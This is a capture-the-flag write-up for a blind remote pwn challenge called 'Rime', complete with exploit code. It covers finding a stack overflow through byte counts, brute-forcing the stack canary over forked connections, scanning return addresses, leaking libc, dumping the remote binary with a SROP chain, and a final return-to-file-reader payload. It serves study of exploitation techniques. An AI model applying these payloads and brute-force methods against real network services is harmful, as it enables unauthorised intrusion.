---
title: "Rime"
description: "No binary was provided, only a TCP service. On connect it prints:"
event: "cryovault"
category: "pwn"
categoryLabel: "Pwn"
tags: ["ISFCR CryoVault Finals 2026","pwn"]
date: "2026-10-26"
teammate: false
source: "cryovault/pwn/rime/writeup.md"
---

**Category:** Pwn (blind / remote-only)
**Target:** `nc 0.cloud.chals.io 24359`
**Flag:** `isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}`

---

## 1. Challenge

No binary was provided, only a TCP service. On connect it prints:

```text
rime gauge up. send readings.
reading> 
```

Every input is consumed by a raw `read()` and answered with the number of
bytes read:

```text
reading> AAAA
pressure 5 recorded.
reading> 
```

The newline is included in the count. Sending several lines in one TCP
segment produces one reading whose count is the whole segment, confirming
this is a raw `read()` loop rather than a line parser.

The service is a sibling of `floe`, `blizzard`, `drif`, `neve`, and
`glacier`, so the same blind-ROP approach applies.

---

## 2. Finding the overflow

Sending increasing lengths quickly shows the boundary:

| Input | Result |
| --- | --- |
| 103 `A`s + `\n` (104 bytes) | `pressure 104 recorded.` and continues |
| 104 `A`s + `\n` (105 bytes) | connection closes |

Offset 104 is therefore the first byte of the stack canary. The usual check
confirms its low byte is `\x00`:

```text
A*104 + "\x00"  -> pressure 105 recorded.   (survives)
A*104 + "\x01"  -> connection closed
```

The vulnerable function is at `0x400640`:

```asm
400640: sub  rsp, 0x88
400647: mov  rax, fs:0x28
400650: mov  [rsp+0x78], rax     ; stack canary
400657: lea  rsi, [rsp+0x10]     ; reading buffer
40065c: mov  edx, 0x400          ; read up to 1024 bytes
400661: call read
...
400684: add  rsp, 0x88
40068b: ret
```

The buffer starts at `rsp+0x10` and the canary at `rsp+0x78`, a distance of
`0x68 = 104` bytes. Because `call` pushed a return address before this
function's `sub rsp, 0x88`, the saved return address is at `rsp+0x88`, i.e.
120 bytes from the start of the buffer.

Recovered stack layout:

| Payload offset | Contents |
| ---: | --- |
| 0–103 | reading buffer |
| 104–111 | stack canary |
| 112–119 | padding |
| 120–127 | saved return address |
| 128 onward | caller frame / ROP data |

The function returns the `read()` byte count in `rax`; its caller at
`0x4006a0` then prints `pressure N recorded.` and loops. Overwriting the
return address skips that print, which is why a crashing return shows no
`pressure` line at all.

---

## 3. Recovering the canary

The service forks a child for every connection. The child inherits the
parent's canary, so the canary is stable across connections and only changes
if the parent restarts. That makes a byte-at-a-time crash oracle possible:

1. Send `104 * "A" + known_canary_prefix + guess`.
2. If the guess is correct, the canary check passes and the service replies
   with `pressure N recorded.` and a new `reading> ` prompt.
3. If the guess is wrong, `__stack_chk_fail` terminates the child and the
   connection closes.

The first byte is known to be `\x00`; the remaining seven bytes are tested
with up to 256 parallel connections per byte (`brute_canary.py`). At solve
time the canary was:

```text
002b61dd0d486293
```

It was verified on a fresh connection with a 112-byte payload:

```text
A*104 + canary  -> pressure 112 recorded.
```

---

## 4. Finding the flag path

With the canary bypassed, the saved return address can be controlled. A blind
scan of `0x400000..0x401000` (`scan_win.py`) recorded every address that
produced output other than a silent EOF. Interesting hits:

| Address | Behaviour |
| ---: | --- |
| `0x400596`–`0x4005c3` | prints the real flag |
| `0x4005cd` | `no pressure reading on this host` |
| `0x4005e8` | leaks stack: canary, client fd, saved RIP, libc return |
| `0x400626` | leaks the reading buffer |

The flag-printing addresses are landing in a nop slide that falls through to
the routine at `0x4005a0`. Disassembling the leaked binary shows it is a
small file reader:

```asm
4005a0: ... 
4005c3: mov  esi, 0
4005c8: mov  edi, 0x401590      ; "flag.txt"
4005cd: call open
...
4005d8: mov  rsi, rsp
4005db: mov  edx, 0xa0
4005e0: mov  edi, eax
4005e2: call read
...
400623: mov  rsi, rsp
400626: mov  rdx, rax
400629: mov  edi, [0x40308c]    ; global client socket fd (4)
40062f: call write
```

The binary contains no hard-coded `isfcr{...}` string. The string at
`0x401590` is `flag.txt`, and the reader sends the file contents to the
client socket stored at `0x40308c`. The flag obtained this way is therefore
the real remote flag, not a decoy.

---

## 5. Dumping the remote ELF

The stack leak at `0x4005e8` starts eight bytes before the canary and exposes
the caller's stack:

```text
0x402e00                    ; some libc/stdio pointer
002b61dd0d486293            ; canary
0x0000000000000004          ; client socket fd
0x000000000040086e          ; return address into the server loop
...
0x00007ffdce4ba9a8          ; stack pointers
0x000079e3c5ad21ca          ; libc return address
```

The libc return ends in `0x21ca`, matching
`__libc_start_call_main+0x8b` in Ubuntu 24.04 glibc 2.39, the same libc used
by the sibling challenges:

```python
libc_base = leaked_ret - 0x2a1ca
```

A SROP chain then performed a raw `write(4, 0x400000, 0x4000)`:

```python
frame = SigreturnFrame()
frame.rax = 1          # write
frame.rdi = 4          # client socket
frame.rsi = 0x400000   # ELF base
frame.rdx = 0x4000
frame.rip = libc_base + 0x288b5
frame.rsp = 0

payload  = b"A" * 104 + canary + b"B" * 8
payload += p64(libc_base + 0xdd337)  # pop rax ; ret
payload += p64(15)                   # rt_sigreturn
payload += p64(libc_base + 0x288b5)  # syscall
payload += bytes(frame)
```

This produced `rime_dump.bin` (a 16 KiB memory image beginning with
`\x7fELF`) and confirmed the layout described above. `rime_text.asm` contains
the disassembly of the dumped `.text`.

---

## 6. Final exploit

Only the canary and the file-reader address are needed. The routine uses the
global client fd, so no argument setup is required.

```python
payload  = b"A" * 104
payload += canary                 # 002b61dd0d486293
payload += b"B" * 8               # padding
payload += p64(0x4005a0)          # open/read/write flag.txt
```

Running `solve.py`:

```text
$ python3 solve.py
rime gauge up. send readings.
reading> isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}
```

---

## 7. Files

| File | Purpose |
| --- | --- |
| `brute_canary.py` | byte-at-a-time canary recovery |
| `scan_win.py` | blind return-address scanner |
| `srop_dump.py` | libc leak + SROP ELF dump |
| `solve.py` | final ret2flag.txt exploit |
| `canary.txt` | recovered canary |
| `rime_dump.bin` | leaked remote ELF (memory image) |
| `rime_text.asm` | disassembly of the dumped `.text` |
| `scan_400000.json` | scanner hits |

---

## 8. Takeaways

- A raw `read()` byte-count response is enough to locate a buffer boundary
  and build a canary oracle.
- Forked services keep the same canary across connections, making a
  crash/no-crash brute force practical.
- A blind return-address scan found the file-reading routine directly; the
  ELF dump was only needed to confirm the layout and prove the flag was read
  from `flag.txt` rather than hard-coded.
